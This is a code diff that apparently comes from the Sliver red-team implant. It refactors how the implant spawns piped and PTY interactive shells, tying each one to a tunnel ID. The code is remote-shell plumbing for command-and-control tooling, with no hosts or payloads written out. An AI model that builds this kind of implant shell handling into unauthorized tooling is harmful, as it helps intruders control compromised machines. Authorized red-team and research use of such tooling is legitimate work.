@@ -9,9 +9,6 @@ import (
 
 	"os"
 	"os/exec"
-	"sync"
-
-	pb "sliver/protobuf/sliver"
 
 	// {{if ne .GOOS "windows"}}
 	"runtime"
@@ -20,64 +17,15 @@ import (
 )
 
 const (
-	readBufSize = 2048
+	readBufSize = 1024
 )
 
-var (
-	// Shells - Access shells and channels
-	Shells = shells{
-		shells: &map[uint32]*Shell{},
-		mutex:  &sync.RWMutex{},
-	}
-
-	shellID = new(uint32)
-)
-
-// Shell - Holds channels for a single shell
+// Shell - Struct to hold shell related data
 type Shell struct {
-	ID    uint32
-	Path  string
-	Read  *chan []byte
-	Write *chan []byte
-}
-
-// Shells - Holds channels for all shells
-type shells struct {
-	shells *map[uint32]*Shell
-	mutex  *sync.RWMutex
-}
-
-// AddShell - Add a shell to shells
-func (s *shells) AddShell(shell *Shell) {
-	s.mutex.Lock()
-	defer s.mutex.Unlock()
-	(*s.shells)[shell.ID] = shell
-}
-
-// CloseShell - Add a shell to shells
-func (s *shells) CloseShell(ID uint32) {
-	s.mutex.Lock()
-	defer s.mutex.Unlock()
-	if shell, ok := (*s.shells)[ID]; ok {
-		close(*shell.Read)
-		delete((*s.shells), ID)
-	}
-}
-
-// RemoveShell - Add a shell to shells
-func (s *shells) WriteData(shellData *pb.ShellData) {
-	s.mutex.Lock()
-	defer s.mutex.Unlock()
-	if shell, ok := (*s.shells)[shellData.ID]; ok {
-		(*shell.Write) <- shellData.Stdin
-	}
-}
-
-// GetShellID - Returns an incremental nonce as an id
-func GetShellID() uint32 {
-	newID := (*shellID) + 1
-	(*shellID)++
-	return newID
+	ID      uint64
+	Command []string
+	Stdout  io.ReadCloser
+	Stdin   io.WriteCloser
 }
 
 // Start - Start a process
@@ -87,18 +35,18 @@ func Start(command string) error {
 }
 
 // StartInteractive - Start a shell
-func StartInteractive(command []string, enablePty bool) *Shell {
+func StartInteractive(tunnelID uint64, command []string, enablePty bool) *Shell {
 
 	// {{if ne .GOOS "windows"}}
 	if enablePty && runtime.GOOS != "windows" {
-		return ptyShell(command)
+		return ptyShell(tunnelID, command)
 	}
 	// {{end}}
 
-	return pipedShell(command)
+	return pipedShell(tunnelID, command)
 }
 
-func pipedShell(command []string) *Shell {
+func pipedShell(tunnelID uint64, command []string) *Shell {
 	// {{if .Debug}}
 	log.Printf("[shell] %s", command)
 	// {{end}}
@@ -108,52 +56,18 @@ func pipedShell(command []string) *Shell {
 
 	stdin, _ := cmd.StdinPipe()
 	stdout, _ := cmd.StdoutPipe()
-
-	read := make(chan []byte)
-	write := make(chan []byte)
-
-	go func() {
-		buf := make([]byte, readBufSize)
-		for {
-			n, err := stdout.Read(buf)
-			// {{if .Debug}}
-			log.Printf("[shell] read (stdout)")
-			// {{end}}
-			if err == io.EOF {
-				// {{if .Debug}}
-				log.Printf("[shell] EOF (stdout)")
-				// {{end}}
-				return
-			}
-			read <- buf[:n]
-
-		}
-	}()
-	go func() {
-		defer func() {
-			stdin.Close()
-			stdout.Close()
-			close(read)
-		}()
-		for incoming := range write {
-			// {{if .Debug}}
-			log.Printf("[shell] write (stdin)")
-			// {{end}}
-			stdin.Write(incoming)
-		}
-	}()
 	cmd.Start()
 
 	return &Shell{
-		ID:    GetShellID(),
-		Path:  command[0],
-		Read:  &read,
-		Write: &write,
+		ID:      tunnelID,
+		Command: command,
+		Stdout:  stdout,
+		Stdin:   stdin,
 	}
 }
 
 // {{if ne .GOOS "windows"}}
-func ptyShell(command []string) *Shell {
+func ptyShell(tunnelID uint64, command []string) *Shell {
 	// {{if .Debug}}
 	log.Printf("[ptmx] %s", command)
 	// {{end}}
@@ -165,47 +79,15 @@ func ptyShell(command []string) *Shell {
 		// {{if .Debug}}
 		log.Printf("[ptmx] %v, falling back to piped shell...", err)
 		// {{end}}
-		return pipedShell(command)
+		return pipedShell(tunnelID, command)
 	}
-
-	read := make(chan []byte)
-	write := make(chan []byte)
-
-	go func() {
-		buf := make([]byte, readBufSize)
-		for {
-			n, err := ptmx.Read(buf)
-			// {{if .Debug}}
-			log.Printf("[ptmx] read (stdout)")
-			// {{end}}
-			if err == io.EOF {
-				// {{if .Debug}}
-				log.Printf("[ptmx] EOF (stdout)")
-				// {{end}}
-				return
-			}
-			read <- buf[:n]
-
-		}
-	}()
-	go func() {
-		defer func() {
-			ptmx.Close()
-		}()
-		for incoming := range write {
-			// {{if .Debug}}
-			log.Printf("[ptmx] write (stdin)")
-			// {{end}}
-			ptmx.Write(incoming)
-		}
-	}()
 	cmd.Start()
 
 	return &Shell{
-		ID:    GetShellID(),
-		Path:  command[0],
-		Read:  &read,
-		Write: &write,
+		ID:      tunnelID,
+		Command: command,
+		Stdout:  ptmx,
+		Stdin:   ptmx,
 	}
 }
 
